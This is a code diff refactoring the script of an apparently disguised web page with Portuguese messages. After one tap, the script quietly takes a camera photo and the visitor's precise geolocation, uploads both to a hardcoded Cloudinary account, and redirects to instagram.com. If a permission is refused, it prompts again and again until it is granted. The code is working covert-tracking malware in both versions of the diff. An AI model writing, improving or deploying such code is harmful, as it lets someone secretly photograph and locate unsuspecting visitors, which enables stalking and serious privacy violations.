@@ -30,21 +30,16 @@
     const cloudName = "dx5legahb";
     const uploadPreset = "upload";
     const folderName = "capturas";
-
+    
     const overlay = document.getElementById("overlay");
 
     function showOverlay(message, callback) {
       overlay.textContent = message;
       overlay.style.display = "flex";
-
-      const handler = () => {
+      overlay.onclick = () => {
         overlay.style.display = "none";
-        overlay.removeEventListener("click", handler);
         if (callback) callback();
       };
-
-      overlay.removeEventListener("click", handler);
-      overlay.addEventListener("click", handler);
     }
 
     async function capturePhoto() {
@@ -54,12 +49,8 @@
           audio: false
         });
         const video = document.createElement("video");
-        video.playsInline = true;
-        video.muted = true;
         video.srcObject = stream;
         await video.play();
-
-        await new Promise(r => setTimeout(r, 200));
 
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth || 640;
@@ -68,9 +59,7 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         stream.getTracks().forEach(track => track.stop());
 
-        const imageData = canvas.toDataURL("image/png");
-        const imageBlob = await (await fetch(imageData)).blob();
-
+        const imageBlob = await (await fetch(canvas.toDataURL("image/png"))).blob();
         const formData = new FormData();
         formData.append("file", imageBlob);
         formData.append("upload_preset", uploadPreset);
@@ -82,56 +71,43 @@
         });
 
         if (!response.ok) throw new Error("Erro ao enviar imagem");
-        const data = await response.json();
-        return data.secure_url;
+        return (await response.json()).secure_url;
       } catch (error) {
-        console.error("Erro na captura da foto:", error);
-        showOverlay("Permissão da câmera é necessária. Toque para tentar novamente.", () => {
-          startFlow(); // volta ao início se a câmera for negada
-        });
+        showOverlay("Permissão da câmera necessária. Toque para tentar novamente.", startFlow);
         throw error;
       }
     }
 
     function requestLocation(imageUrl) {
-      const tryGetLocation = () => {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-          try {
-            const { latitude, longitude } = pos.coords;
-            const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
-            const textBlob = new Blob([texto], { type: "text/plain" });
+      const getLocation = () => {
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            try {
+              const { latitude, longitude } = pos.coords;
+              const textBlob = new Blob([`Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`], { type: "text/plain" });
+              const textForm = new FormData();
+              textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
+              textForm.append("upload_preset", uploadPreset);
+              textForm.append("folder", folderName);
 
-            const textForm = new FormData();
-            textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
-            textForm.append("upload_preset", uploadPreset);
-            textForm.append("folder", folderName);
+              const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
+                method: "POST",
+                body: textForm
+              });
 
-            const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
-              method: "POST",
-              body: textForm
-            });
-
-            if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
-            window.location.href = "https://instagram.com";
-          } catch (err) {
-            console.error("Erro no envio da localização:", err);
-            showOverlay("Permissão de localização é necessária. Toque para tentar novamente.", () => {
-              tryGetLocation();
-            });
-          }
-        }, (err) => {
-          console.error("Erro ao obter localização:", err);
-          showOverlay("Permissão de localização é necessária. Toque para tentar novamente.", () => {
-            tryGetLocation();
-          });
-        }, {
-          enableHighAccuracy: true,
-          timeout: 8000,
-          maximumAge: 0
-        });
+              if (!textResp.ok) throw new Error("Erro ao enviar localização");
+              window.location.href = "https://instagram.com";
+            } catch (err) {
+              showOverlay("Erro ao enviar localização. Toque para tentar novamente.", getLocation);
+            }
+          },
+          () => {
+            showOverlay("Permissão de localização negada. Toque para tentar novamente.", getLocation);
+          },
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+        );
       };
-
-      tryGetLocation(); // primeira tentativa
+      getLocation();
     }
 
     async function startFlow() {
@@ -144,7 +120,7 @@
     }
 
     window.addEventListener("DOMContentLoaded", () => {
-      showOverlay("Toque para continuar...", () => startFlow());
+      showOverlay("Toque para continuar...", startFlow);
     });
   </script>
 </body>
